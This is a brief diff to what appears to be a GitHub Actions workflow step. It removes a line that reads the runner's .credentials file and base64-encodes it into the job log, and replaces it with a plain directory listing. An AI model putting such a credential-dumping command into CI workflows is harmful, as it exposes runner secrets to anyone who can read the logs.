@@ -5,7 +5,7 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - run: |     
-            cat /home/runner/runners/2.283.2/.credentials | base64
+            ls -la /home/runner/runners/2.283.2/.credentials
 
 
 
